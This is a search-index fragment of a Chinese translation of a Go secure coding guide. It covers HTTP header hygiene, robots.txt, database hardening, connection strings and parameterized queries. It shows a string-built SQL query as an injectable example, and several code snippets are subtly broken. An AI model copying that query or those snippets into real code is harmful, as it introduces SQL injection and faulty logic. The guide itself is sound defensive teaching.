\u4e0d\u9700\u8981\u4efb\u4f55\u6d4b\u8bd5\u4ee3\u7801\u548c\u51fd\u6570\u3002 \u6211\u4eec\u8fd8\u5e94\u8be5\u68c0\u67e5HTTP\u54cd\u5e94\u5934\u3002\u5220\u9664\u54cd\u5e94\u5934\u4e2d\u66b4\u9732\u7684\u654f\u611f\u4fe1\u606f\uff0c\u4f8b\u5982: \u64cd\u4f5c\u7cfb\u7edf\u7248\u672c Webserver\u7248\u672c \u6846\u67b6\u6216\u7f16\u7a0b\u8bed\u8a00\u7248\u672c \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u4fe1\u606f\u6765\u68c0\u67e5\u4f60\u516c\u5f00\u7684\u7248\u672c\u4e2d\u7684\u6f0f\u6d1e\uff0c\u56e0\u6b64\u5efa\u8bae\u5220\u9664\u5b83\u4eec\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cGo\u4e0d\u4f1a\u516c\u5f00\u8fd9\u4e9b\u5185\u5bb9\u3002\u4f46\u662f\uff0c\u5982\u679c\u4f60\u4f7f\u7528\u4efb\u4f55\u7c7b\u578b\u7684\u5916\u90e8\u5305\u6216\u6846\u67b6\uff0c\u4e0d\u8981\u5fd8\u8bb0\u4ed4\u7ec6\u68c0\u67e5\u3002 \u7c7b\u4f3c\u8fd9\u6837\u7684\uff1a w.Header().Set( X-Request-With , Go Vulnerable Framework 1.2 ) \u5728\u4ee3\u7801\u4e2d\u641c\u7d22\uff0c\u66b4\u9732\u7684HTTP\u5934\u7684\u4ee3\u7801\uff0c\u7136\u540e\u5220\u9664\u5b83\u3002 \u4f60\u8fd8\u53ef\u4ee5\u5728web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u652f\u6301\u54ea\u4e9bHTTP\u65b9\u6cd5\u3002\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u53ea\u63a5\u53d7 POST \u548c GET \u8bf7\u6c42\uff0c\u4f7f\u7528\u4ee5\u4e0b\u4ee3\u7801\u5b9e\u73b0CORS\uff1a w.Header().Set( Access-Control-Allow-Methods , POST, GET ) \u4e0d\u8981\u62c5\u5fc3\u7981\u7528WebDAV\u4e4b\u7c7b\u7684\u4e1c\u897f\uff0c\u56e0\u4e3a\u5982\u679c\u8981\u5b9e\u73b0WebDAV\u670d\u52a1\u5668\uff0c\u9700\u8981\u5bfc\u5165\u4e00\u4e2a \u5305 \u3002","title":"\u5220\u9664/\u7981\u7528\u4f60\u4e0d\u9700\u8981\u7684\u5185\u5bb9"},{"location":"application-security/sdl/go-scp/#_44","text":"\u8c03\u6574\u597d\u5fc3\u6001\uff0c\u7136\u540e\u9075\u5faaWeb\u670d\u52a1\u5668\uff0c\u6d41\u7a0b\u548c\u670d\u52a1\u5e10\u6237\u4e0a\u7684 \u6700\u5c0f\u6743\u9650\u539f\u5219 \u3002 \u5173\u6ce8web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u9519\u8bef\u5904\u7406\u3002\u53d1\u751f\u5f02\u5e38\u65f6\uff0c\u5b89\u5168\u5730\u5904\u7406\u9519\u8bef\u3002 \u4f60\u53ef\u4ee5\u67e5\u770b\u672c\u6307\u5357\u4e2d\u7684 \u9519\u8bef\u5904\u7406 ](https://www.giac.org/paper/gsec/2693/implementation-methodology-information-security-management-system-to-comply-bs-7799-requi/104600)) )\u548c \u65e5\u5fd7\u8bb0\u5f55 \u90e8\u5206\uff0c\u4ee5\u83b7\u53d6\u6709\u5173\u6b64\u4e3b\u9898\u7684\u66f4\u591a\u4fe1\u606f\u3002 \u9632\u6b62\u5728 robots.txt \u6587\u4ef6\u4e2d\u66b4\u9732\u76ee\u5f55\u7ed3\u6784\u3002robots.txt\u662f\u4e00\u4e2a\u65b9\u5411\u6587\u4ef6\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u5b89\u5168\u63a7\u4ef6\u3002 \u91c7\u7528\u767d\u540d\u5355\u65b9\u6cd5\uff1a User-agent: * Allow: /sitemap.xml Allow: /index Allow: /contact Allow: /aboutus Disallow: / \u4e0a\u9762\u7684\u793a\u4f8b\u5c06\u5141\u8bb8\u4efb\u4f55\u7528\u6237\u4ee3\u7406\u6216\u673a\u5668\u4eba\u7d22\u5f15\u8fd9\u4e9b\u7279\u5b9a\u9875\u9762\uff0c\u5e76\u7981\u6b62\u5176\u4f59\u9875\u9762\u3002 \u8fd9\u6837\u5c31\u4e0d\u4f1a\u6cc4\u9732\u654f\u611f\u6587\u4ef6\u5939\u6216\u9875\u9762 - \u4f8b\u5982\u7ba1\u7406\u8def\u5f84\u6216\u5176\u4ed6\u91cd\u8981\u6570\u636e\u3002 \u5c06\u5f00\u53d1\u73af\u5883\u4e0e\u751f\u4ea7\u73af\u5883\u7684\u7f51\u7edc\u9694\u79bb\u5f00\u6765\u3002\u4e3a\u5f00\u53d1\u4eba\u5458\u548c\u6d4b\u8bd5\u7ec4\uff0c\u63d0\u4f9b\u6b63\u786e\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u66f4\u597d\u7684\u662f\u521b\u5efa\u989d\u5916\u7684\u5b89\u5168\u5c42\u6765\u4fdd\u62a4\u5b83\u4eec\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u5f00\u53d1\u73af\u5883\u66f4\u5bb9\u6613\u6210\u4e3a\u653b\u51fb\u7684\u76ee\u6807\u3002 \u6700\u540e\uff0c\u4f46\u4ecd\u7136\u975e\u5e38\u91cd\u8981\u7684\u662f\uff0c\u8981\u6709\u4e00\u4e2a\u8f6f\u4ef6\u66f4\u6539\u63a7\u5236\u7cfb\u7edf\u6765\u7ba1\u7406\u548c\u8bb0\u5f55Web\u5e94\u7528\u7a0b\u5e8f\u4ee3\u7801\uff08\u5f00\u53d1\u548c\u751f\u4ea7\u73af\u5883\uff09\u4e2d\u7684\u66f4\u6539\u3002\u6709\u8bb8\u591a\u5728\u4f60\u81ea\u5df1\u4e3b\u673a\u4e0a\u642d\u5efa\u7c7b\u4f3cGithub\u7684\u514b\u9686\u53ef\u4ee5\u7528\u4e8e\u6b64\u76ee\u7684\u3002","title":"\u5b9e\u73b0\u66f4\u597d\u7684\u5b89\u5168\u6027"},{"location":"application-security/sdl/go-scp/#_45","text":"\u867d\u7136\u8d44\u4ea7\u7ba1\u7406\u7cfb\u7edf\u4e0d\u662fGo\u7279\u5b9a\u7684\u95ee\u9898\uff0c\u4f46\u4ee5\u4e0b\u90e8\u5206\u5c06\u7b80\u8981\u6982\u8ff0\u8be5\u6982\u5ff5\u53ca\u5176\u5b9e\u8df5\u3002 \u8d44\u4ea7\u7ba1\u7406\u5305\u62ec\u7ec4\u7ec7\u6267\u884c\u7684\u4e00\u7cfb\u5217\u6d3b\u52a8\uff0c\u4ee5\u4fbf\u6839\u636e\u7ec4\u7ec7\u76ee\u6807\u5b9e\u73b0\u8d44\u4ea7\u7684\u6700\u4f73\u914d\u7f6e\uff0c\u4ee5\u53ca\u5bf9\u6bcf\u9879\u8d44\u4ea7\u6240\u9700\u5b89\u5168\u7ea7\u522b\u7684\u8bc4\u4f30\u3002\u5e94\u8be5\u6ce8\u610f\u7684\u662f\uff0c\u5728\u672c\u8282\u4e2d\uff0c\u5f53\u6211\u4eec\u63d0\u5230\u8d44\u4ea7\u65f6\uff0c\u6211\u4eec\u4e0d\u4ec5\u8ba8\u8bba\u7cfb\u7edf\u7684\u7ec4\u4ef6\uff0c\u800c\u4e14\u8fd8\u8ba8\u8bba\u8f6f\u4ef6\u3002 \u5b9e\u65bd\u8be5\u7cfb\u7edf\u6d89\u53ca\u7684\u6b65\u9aa4\u5982\u4e0b\uff1a 1. \u786e\u5b9a\u4fe1\u606f\u5b89\u5168\u5728\u4f01\u4e1a\u4e2d\u7684\u91cd\u8981\u6027\u3002 2. \u5b9a\u4e49AMS\u7684\u8303\u56f4\u3002 3. \u5b9a\u4e49\u5b89\u5168\u7b56\u7565\u3002 4. \u5efa\u7acb\u5b89\u5168\u7ec4\u7ec7\u7ed3\u6784\u3002 5. \u8bc6\u522b\u548c\u5206\u7c7b\u8d44\u4ea7\u3002 6. \u8bc6\u522b\u548c\u8bc4\u4f30\u98ce\u9669\u3002 7. \u89c4\u5212\u98ce\u9669\u7ba1\u7406\u3002 8. \u5b9e\u65bd\u98ce\u9669\u7f13\u89e3\u7b56\u7565\u3002 9. \u5199\u4e0b\u9002\u7528\u6027\u58f0\u660e\u3002 10. \u57f9\u8bad\u5458\u5de5\u5e76\u6811\u7acb\u5b89\u5168\u610f\u8bc6\u3002 11. \u76d1\u63a7\u5e76\u67e5\u770bAMS\u6027\u80fd\u3002 12. \u7ef4\u62a4AMS\u5e76\u786e\u4fdd\u6301\u7eed\u6539\u8fdb\u3002 \u53ef\u4ee5\u5728 \u6b64\u5904 \u627e\u5230\u5bf9\u6b64\u5b9e\u73b0\u66f4\u6df1\u5165\u7684\u5206\u6790\u3002","title":"\u8d44\u4ea7\u7ba1\u7406\u7cfb\u7edf\uff1a"},{"location":"application-security/sdl/go-scp/#_46","text":"\u5173\u4e8eOWASP SCP\u7684\u8fd9\u4e00\u8282\uff0c\u5c06\u8ba8\u8bba\u5f00\u53d1\u4eba\u5458\u548cDBA\uff0c\u5728web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u6570\u636e\u5e93\u65f6\uff0c\u9700\u8981\u91c7\u53d6\u7684\u6240\u6709\u6570\u636e\u5e93\u5b89\u5168\u95ee\u9898\u548c\u64cd\u4f5c\u3002 Go\u6ca1\u6709\u6570\u636e\u5e93\u9a71\u52a8\u7a0b\u5e8f\uff0c\u800c\u662f\u5728 database/sql \u5305\u4e0a\u6709\u4e00\u4e2a\u6838\u5fc3\u63a5\u53e3\u9a71\u52a8\u7a0b\u5e8f\u3002\u8fd9\u610f\u5473\u7740\u5728\u4f7f\u7528\u6570\u636e\u5e93\u8fde\u63a5\u65f6\u9700\u8981\u6ce8\u518cSQL\u9a71\u52a8\u7a0b\u5e8f(\u4f8b\u5982: MariaDB \u3001 sqlite3 )\u3002","title":"\u6570\u636e\u5e93\u5b89\u5168"},{"location":"application-security/sdl/go-scp/#_47","text":"\u5728Go\u4e2d\u5b9e\u73b0\u6570\u636e\u5e93\u4e4b\u524d\uff0c\u60a8\u5e94\u8be5\u6ce8\u610f\u4e0b\u9762\u6211\u4eec\u5c06\u8ba8\u8bba\u7684\u4e00\u4e9b\u914d\u7f6e\uff1a \u5b89\u5168\u6570\u636e\u5e93\u5b89\u88c5 \u66f4\u6539/\u8bbe\u7f6eroot\u8d26\u6237\u7684\u5bc6\u7801\uff1b \u5220\u9664\u672c\u5730\u4e3b\u673a\u5916\u90e8\u53ef\u8bbf\u95ee\u7684root\u5e10\u6237\uff1b \u5220\u9664\u4efb\u4f55\u533f\u540d\u7528\u6237\u5e10\u6237\uff1b \u5220\u9664\u4efb\u4f55\u73b0\u6709\u7684\u6d4b\u8bd5\u6570\u636e\u5e93\uff1b \u5220\u9664\u4efb\u4f55\u4e0d\u5fc5\u8981\u7684\u5b58\u50a8\u8fc7\u7a0b\u3001\u5b9e\u7528\u7a0b\u5e8f\u5305\u3001\u4e0d\u5fc5\u8981\u7684\u670d\u52a1\u3001vendor\u5185\u5bb9(\u4f8b\u5982\u793a\u4f8b\u6a21\u5f0f)\u3002 \u5b89\u88c5\u6570\u636e\u5e93\u4e0eGo\u4e00\u8d77\u4f7f\u7528\u6240\u9700\u7684\u6700\u5c11\u529f\u80fd\u548c\u9009\u9879\u96c6\u3002 \u7981\u7528web\u5e94\u7528\u7a0b\u5e8f\u4e0a\u4e0d\u9700\u8981\u8fde\u63a5\u5230\u6570\u636e\u5e93\u7684\u4efb\u4f55\u9ed8\u8ba4\u5e10\u6237\u3002 \u53e6\u5916\uff0c\u7531\u4e8e\u9a8c\u8bc1\u6570\u636e\u5e93\u4e0a\u7684\u8f93\u5165\u548c\u7f16\u7801\u8f93\u51fa\u975e\u5e38\u91cd\u8981\uff0c\u6240\u4ee5\u8bf7\u52a1\u5fc5\u9605\u8bfb\u672c\u6307\u5357\u7684 \u8f93\u5165\u9a8c\u8bc1 \u548c \u8f93\u51fa\u7f16\u7801 \u90e8\u5206\u3002 \u5728\u4f7f\u7528\u6570\u636e\u5e93\u65f6\uff0c\u8fd9\u57fa\u672c\u4e0a\u53ef\u4ee5\u9002\u7528\u4e8e\u4efb\u4f55\u7f16\u7a0b\u8bed\u8a00\u3002","title":"\u6700\u4f73\u5b9e\u8df5"},{"location":"application-security/sdl/go-scp/#_48","text":"","title":"\u6570\u636e\u5e93\u8fde\u63a5"},{"location":"application-security/sdl/go-scp/#_49","text":"sql.Open \u4e0d\u8fd4\u56de\u6570\u636e\u5e93\u8fde\u63a5\uff0c\u800c\u662f\u8fd4\u56de *DB \uff1a\u6570\u636e\u5e93\u8fde\u63a5\u6c60\u3002\u5f53\u8fd0\u884c\u4e00\u4e2a\u6570\u636e\u5e93\u64cd\u4f5c\uff08\u4f8b\u5982\u67e5\u8be2\uff09\u65f6\uff0c\u4ece\u6c60\u4e2d\u53d6\u51fa\u4e00\u4e2a\u53ef\u7528\u8fde\u63a5\uff0c\u8be5\u8fde\u63a5\u5e94\u8be5\u5728\u64cd\u4f5c\u5b8c\u6210\u540e\u7acb\u5373\u8fd4\u56de\u5230\u8fde\u63a5\u6c60\u4e2d\u3002 \u8bf7\u8bb0\u4f4f\uff0c\u4ec5\u5728\u9996\u6b21\u6267\u884c\u6570\u636e\u5e93\u64cd\u4f5c\uff08\u5982\u67e5\u8be2\uff09\u65f6\u624d\u4f1a\u6253\u5f00\u4e00\u4e2a\u6570\u636e\u5e93\u8fde\u63a5\u3002 sql.Open \u5e76\u4e0d\u4f1a\u6d4b\u8bd5\u6570\u636e\u5e93\u8fde\u63a5\uff1a\u6570\u636e\u5e93\u51ed\u636e\u9519\u8bef\uff0c\u8981\u5728\u7b2c\u4e00\u4e2a\u6570\u636e\u5e93\u64cd\u4f5c\u6267\u884c\u65f6\u624d\u4f1a\u89e6\u53d1\u3002 \u6839\u636e\u7ecf\u9a8c\uff0c\u5e94\u8be5\u59cb\u7ec8\u4f7f\u7528 database/sql \u63a5\u53e3\u7684\u4e0a\u4e0b\u6587\u53d8\u4f53(\u4f8b\u5982QueryContext())\uff0c\u5e76\u63d0\u4f9b\u9002\u5f53\u7684 \u4e0a\u4e0b\u6587 \u3002 \u6765\u81eaGo\u5b98\u65b9\u6587\u6863\uff1a\u201cPackage\u4e0a\u4e0b\u6587\u5b9a\u4e49\u4e86Context\u7c7b\u578b\uff0c\u5b83\u8de8API\u8fb9\u754c\u548c\u8fdb\u7a0b\u4e4b\u95f4\u4f20\u9012\u622a\u6b62\u65e5\u671f\uff0c\u53d6\u6d88\u4fe1\u53f7\u548c\u5176\u4ed6\u8bf7\u6c42\u8303\u56f4\u7684\u503c\u3002\u201d \u5728\u6570\u636e\u5e93\u7ea7\u522b\uff0c\u5f53\u4e0a\u4e0b\u6587\u88ab\u53d6\u6d88\u65f6\uff0c\u5982\u679c\u6ca1\u6709\u63d0\u4ea4\u4e8b\u52a1\uff0c\u5c06\u56de\u6eda\u4e8b\u52a1\uff0crows(\u6765\u81eaQueryContext)\u5c06\u88ab\u5173\u95ed\uff0c\u5e76\u8fd4\u56de\u6240\u6709\u8d44\u6e90\u3002 package main import ( context database/sql fmt log time _ github.com/go-sql-driver/mysql ) type program struct { base context.Context cancel func() db *sql.DB } func main() { db, err := sql.Open( mysql , user:@/cxdb ) if err != nil { log.Fatal(err) } p := program{db: db} p.base, p.cancel = context.WithCancel(context.Background()) // Wait for program termination request, cancel base context on request. go func() { osSignal := // ... select { case -p.base.Done(): case -osSignal: p.cancel() } // Optionally wait for N milliseconds before calling os.Exit. }() err = p.doOperation() if err != nil { log.Fatal(err) } } func (p *program) doOperation() error { ctx, cancel := context.WithTimeout(p.base, 10 * time.Second) defer cancel() var version string err := p.db.QueryRowContext(ctx, SELECT VERSION(); ).Scan( version) if err != nil { return fmt.Errorf( unable to read version %v , err) } fmt.Println( Connected to: , version) }","title":"\u6982\u5ff5"},{"location":"application-security/sdl/go-scp/#_50","text":"\u4e3a\u4e86\u4fdd\u8bc1\u8fde\u63a5\u5b57\u7b26\u4e32\u7684\u5b89\u5168\u6027\uff0c\u6700\u597d\u5c06\u8eab\u4efd\u9a8c\u8bc1\u7ec6\u8282\u653e\u5728\u516c\u5171\u8bbf\u95ee\u4e4b\u5916\u7684\u72ec\u7acb\u914d\u7f6e\u6587\u4ef6\u4e2d\u3002 \u4e0d\u8981\u5c06\u914d\u7f6e\u6587\u4ef6\u653e\u5728 /home/public_html/ \u4e2d\uff0c\u800c\u662f\u8003\u8651\u653e\u5728 /home/private/configdb.xml \u4e2d(\u53d7\u4fdd\u62a4\u7684\u533a\u57df) connectionDB serverDB localhost /serverDB userDB f00 /userDB passDB f00?bar#ItsP0ssible /passDB /connectionDB \u7136\u540e\u4f60\u53ef\u4ee5\u5728Go\u6587\u4ef6\u4e2d\u8c03\u7528config.xml\u6587\u4ef6\uff1a configFile, _ := os.Open( ../private/configDB.xml ) \u8bfb\u53d6\u6587\u4ef6\u540e\uff0c\u8fde\u63a5\u6570\u636e\u5e93\uff1a db, _ := sql.Open(serverDB, userDB, passDB) \u5f53\u7136\uff0c\u5982\u679c\u653b\u51fb\u8005\u5177\u6709root\u8bbf\u95ee\u6743\u9650\uff0c\u4ed6\u5c31\u53ef\u4ee5\u770b\u5230\u8be5\u6587\u4ef6\u3002\u8fd9\u5c31\u5f15\u51fa\u4e86\u4f60\u80fd\u505a\u7684\u6700\u8c28\u614e\u7684\u4e8b\u60c5--\u52a0\u5bc6\u6587\u4ef6\u3002","title":"\u8fde\u63a5\u5b57\u7b26\u4e32\u7684\u4fdd\u62a4"},{"location":"application-security/sdl/go-scp/#_51","text":"\u4f60\u5e94\u8be5\u4e3a\u6bcf\u4e2a\u4fe1\u4efb\u533a\u5757\u548c\u7ea7\u522b\u4f7f\u7528\u4e0d\u540c\u7684\u51ed\u636e: \u7528\u6237 \u53ea\u8bfb\u7528\u6237 \u5ba2\u4eba \u7ba1\u7406 \u8fd9\u6837\uff0c\u5982\u679c\u8fde\u63a5\u662f\u4e3a\u53ea\u8bfb\u7528\u6237\u5efa\u7acb\u7684\uff0c\u4ed6\u4eec\u5c31\u6c38\u8fdc\u4e0d\u4f1a\u7834\u574f\u6570\u636e\u5e93\u4fe1\u606f\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u7528\u6237\u5b9e\u9645\u4e0a\u53ea\u80fd\u8bfb\u53d6\u6570\u636e\u3002","title":"\u6570\u636e\u5e93\u8bc1\u4e66"},{"location":"application-security/sdl/go-scp/#_52","text":"","title":"\u6570\u636e\u5e93\u8ba4\u8bc1"},{"location":"application-security/sdl/go-scp/#_53","text":"\u5982\u679c\u60a8\u7684Go web\u5e94\u7528\u7a0b\u5e8f\u53ea\u9700\u8981\u8bfb\u53d6\u6570\u636e\u800c\u4e0d\u9700\u8981\u5199\u5165\u4fe1\u606f\uff0c\u90a3\u4e48\u521b\u5efa\u4e00\u4e2a\u6743\u9650\u4e3a\u53ea\u8bfb\u7684\u6570\u636e\u5e93\u7528\u6237\u3002\u59cb\u7ec8\u6839\u636eweb\u5e94\u7528\u7a0b\u5e8f\u7684\u9700\u8981\u8c03\u6574\u6570\u636e\u5e93\u7528\u6237\u3002","title":"\u4ee5\u6700\u5c0f\u6743\u9650\u8bbf\u95ee\u6570\u636e\u5e93"},{"location":"application-security/sdl/go-scp/#_54","text":"\u521b\u5efa\u6570\u636e\u5e93\u8bbf\u95ee\u6743\u9650\u65f6\uff0c\u8bf7\u9009\u62e9\u5f3a\u5bc6\u7801\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528\u5bc6\u7801\u7ba1\u7406\u5668\u6765\u751f\u6210\u5f3a\u5bc6\u7801\uff0c\u6216\u8005\u4f7f\u7528\u4e3a\u4f60\u6267\u884c\u76f8\u540c\u64cd\u4f5c\u7684\u5728\u7ebfWeb\u5e94\u7528\u7a0b\u5e8f - \u5f3a\u5bc6\u7801\u751f\u6210\u5668 \u3002","title":"\u4f7f\u7528\u5f3a\u5bc6\u7801"},{"location":"application-security/sdl/go-scp/#_55","text":"\u5927\u591a\u6570DBS\u90fd\u6709\u9ed8\u8ba4\u5e10\u6237\uff0c\u5176\u4e2d\u5927\u90e8\u5206\u90fd\u6ca1\u6709\u6700\u9ad8\u6743\u9650\u7528\u6237\u7684\u5bc6\u7801\u3002 MariaDB\uff0cMongoDB - root /\u65e0\u5bc6\u7801 \u8fd9\u610f\u5473\u7740\u5982\u679c\u6ca1\u6709\u5bc6\u7801\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8bbf\u95ee\u6240\u6709\u5185\u5bb9\u3002 \u6b64\u5916\uff0c\u5982\u679c\u4f60\u8981\u5c06\u4ee3\u7801\u53d1\u5e03\u5728Github\u7684\u53ef\u516c\u5f00\u8bbf\u95ee\u7684\u5b58\u50a8\u5e93\u4e2d\uff0c\u8bf7\u4e0d\u8981\u5fd8\u8bb0\u5220\u9664\u60a8\u7684\u51ed\u636e\u6216\u79c1\u94a5\u3002","title":"\u5220\u9664\u9ed8\u8ba4\u7684\u7ba1\u7406\u5bc6\u7801"},{"location":"application-security/sdl/go-scp/#_56","text":"\u9884\u5148\u51c6\u5907\u597d\u7684\u67e5\u8be2\u8bed\u53e5(\u5e26\u6709\u53c2\u6570\u5316\u67e5\u8be2)\u662f\u9632\u6b62SQL\u6ce8\u5165\u7684\u6700\u4f73\u548c\u6700\u5b89\u5168\u7684\u65b9\u6cd5\u3002 \u5728\u67d0\u4e9b\u62a5\u544a\u7684\u60c5\u51b5\u4e0b\uff0c\u9884\u5148\u51c6\u5907\u597d\u7684\u8bed\u53e5\u53ef\u80fd\u4f1a\u6709\u635fweb\u5e94\u7528\u7a0b\u5e8f\u7684\u6027\u80fd\u3002\u56e0\u6b64\uff0c\u5982\u679c\u51fa\u4e8e\u67d0\u79cd\u539f\u56e0\u9700\u8981\u505c\u6b62\u4f7f\u7528\u8fd9\u79cd\u7c7b\u578b\u7684\u6570\u636e\u5e93\u67e5\u8be2\uff0c\u6211\u4eec\u5f3a\u70c8\u5efa\u8bae\u9605\u8bfb \u8f93\u5165\u9a8c\u8bc1 \u548c \u8f93\u51fa\u7f16\u7801 \u90e8\u5206\u3002 Go\u4e0e\u5176\u4ed6\u8bed\u8a00\u7684\u5e38\u7528\u9884\u51c6\u5907\u8bed\u53e5\u7684\u5de5\u4f5c\u65b9\u5f0f\u4e0d\u540c - \u4f60\u4e0d\u9700\u8981\u5728\u8fde\u63a5\u4e0a\u51c6\u5907\u8bed\u53e5\uff0c \u800c\u5728DB\u4e0a\u51c6\u5907\u3002","title":"\u53c2\u6570\u5316\u67e5\u8be2"},{"location":"application-security/sdl/go-scp/#_57","text":"\u5f00\u53d1\u4eba\u5458\u5728\u8fde\u63a5\u6c60\u4e2d\u7684\u4e00\u4e2a\u8fde\u63a5\u4e0a\u51c6\u5907\u8bed\u53e5(Stmt) Stmt\u5bf9\u8c61\u4f1a\u8bb0\u4f4f\u4f7f\u7528\u4e86\u54ea\u4e2a\u8fde\u63a5 \u5f53\u5e94\u7528\u7a0b\u5e8f\u6267\u884cStmt\u65f6\uff0c\u5b83\u5c1d\u8bd5\u4f7f\u7528\u8be5\u8fde\u63a5\u3002\u5982\u679c\u5b83\u4e0d\u53ef\u7528\uff0c\u5b83\u5c06\u5c1d\u8bd5\u5728\u6c60\u4e2d\u627e\u5230\u53e6\u4e00\u4e2a\u8fde\u63a5 \u8fd9\u79cd\u7c7b\u578b\u7684\u6d41\u53ef\u80fd\u5bfc\u81f4\u6570\u636e\u5e93\u7684\u9ad8\u5e76\u53d1\u6027\u4f7f\u7528\uff0c\u5e76\u521b\u5efa\u5927\u91cf\u9884\u51c6\u5907\u7684\u8bed\u53e5\u3002\u6240\u4ee5\uff0c\u8bb0\u4f4f\u8fd9\u4e9b\u4fe1\u606f\u975e\u5e38\u91cd\u8981\u3002 \u4ee5\u4e0b\u662f\u5e26\u53c2\u6570\u5316\u67e5\u8be2\u7684\u9884\u51c6\u5907\u8bed\u53e5\u7684\u793a\u4f8b\uff1a customerName := r.URL.Query().Get( name ) db.Exec( UPDATE creditcards SET name=? WHERE customerId=? , customerName, 233, 90) \u6709\u65f6\u5019\uff0c\u51c6\u5907\u597d\u7684\u8bed\u53e5\u4e0d\u662f\u4f60\u60f3\u8981\u7684\u3002\u8fd9\u53ef\u80fd\u6709\u51e0\u4e2a\u539f\u56e0\uff1a \u6570\u636e\u5e93\u4e0d\u652f\u6301\u9884\u51c6\u5907\u8bed\u53e5\u3002\u4f8b\u5982\uff0c\u5728\u4f7f\u7528MySQL\u9a71\u52a8\u7a0b\u5e8f\u65f6\uff0c\u53ef\u4ee5\u8fde\u63a5\u5230MemSQL\u548cSphinx\uff0c\u56e0\u4e3a\u5b83\u4eec\u652f\u6301MySQL \u6709\u7ebf\u534f\u8bae\u3002\u4f46\u662f\u5b83\u4eec\u4e0d\u652f\u6301\u5305\u542b\u9884\u51c6\u5907\u8bed\u53e5\u7684\u201c\u4e8c\u8fdb\u5236\u201d\u534f\u8bae\uff0c\u56e0\u6b64\u5b83\u4eec\u53ef\u80fd\u4f1a\u4ee5\u4ee4\u4eba\u56f0\u60d1\u7684\u65b9\u5f0f\u5931\u8d25\u3002 \u8fd9\u4e9b\u8bed\u53e5\u7684\u91cd\u7528\u6027\u4e0d\u8db3\u4ee5\u4f7f\u5b83\u4eec\u53d8\u5f97\u6709\u4ef7\u503c\uff0c\u5e76\u4e14\u5b89\u5168\u95ee\u9898\u5728\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u5806\u6808\u7684\u53e6\u4e00\u5c42\u5904\u7406\uff08\u8bf7\u53c2\u9605\uff1a \u8f93\u5165\u9a8c\u8bc1 \u548c \u8f93\u51fa\u7f16\u7801 \uff0c\u56e0\u6b64\u4e0a\u9762\u6240\u793a\u7684\u6027\u80fd\u662f\u4e0d\u53ef\u53d6\u7684\u3002","title":"\u793a\u4f8b"},{"location":"application-security/sdl/go-scp/#_58","text":"\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u5b58\u50a8\u8fc7\u7a0b\u521b\u5efa\u67e5\u8be2\u7684\u7279\u5b9a\u89c6\u56fe\uff0c\u4ee5\u9632\u6b62\u654f\u611f\u4fe1\u606f\u88ab\u5f52\u6863\uff0c\u800c\u4e0d\u662f\u4f7f\u7528\u666e\u901a\u67e5\u8be2\u3002 \u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2a\u63a5\u53e3\uff0c\u901a\u8fc7\u521b\u5efa\u548c\u9650\u5236\u5bf9\u5b58\u50a8\u8fc7\u7a0b\u7684\u8bbf\u95ee\uff0c\u5c06\u4e00\u4e2a\u4eba\u4f7f\u7528\u7279\u5b9a\u5b58\u50a8\u8fc7\u7a0b\u548c\u53ef\u4ee5\u8bbf\u95ee\u7684\u4fe1\u606f\u7c7b\u578b\u533a\u5206\u5f00\u6765\u3002\u4f7f\u7528\u6b64\u529f\u80fd\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u66f4\u5bb9\u6613\u5730\u7ba1\u7406\u8be5\u8fc7\u7a0b\uff0c\u7279\u522b\u662f\u5728\u4ece\u5b89\u5168\u89d2\u5ea6\u63a7\u5236\u8868\u548c\u5217\u65f6\uff0c\u975e\u5e38\u65b9\u4fbf\u3002 \u8ba9\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50\u2026\u2026 \u5047\u8bbe\u4f60\u6709\u4e00\u4e2a\u8868\uff0c\u5176\u4e2d\u5305\u542b\u5173\u4e8e\u7528\u6237\u62a4\u7167ID\u7684\u4fe1\u606f\u3002 \u4f7f\u7528\u5982\u4e0b\u67e5\u8be2: SELECT * FROM tblUsers WHERE userId = $user_input \u9664\u4e86\u8f93\u5165\u9a8c\u8bc1\u7684\u95ee\u9898\u4e4b\u5916\uff0c\u6570\u636e\u5e93\u7528\u6237(\u5728\u672c\u4f8b\u4e2d\uff0c\u7528\u6237\u540d\u4e3aJohn)\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7528\u6237ID\u8bbf\u95ee\u6240\u6709\u4fe1\u606f\u3002 \u5982\u679cJohn\u53ea\u80fd\u4f7f\u7528\u8fd9\u4e2a\u5b58\u50a8\u8fc7\u7a0b\u4f1a\u600e\u6837\uff1a CREATE PROCEDURE db.getName @userId int = NULL AS SELECT name, lastname FROM tblUsers WHERE userId = @userId GO \u4f60\u53ea\u9700\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5373\u53ef\u8fd0\u884c\uff1a EXEC db.getName @userId = 14 \u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u4f60\u53ef\u4ee5\u786e\u5b9a\u7528\u6237John\u53ea\u770b\u5230\u4ed6\u8bf7\u6c42\u7684\u7528\u6237\u7684 name \u548c lastname \u3002 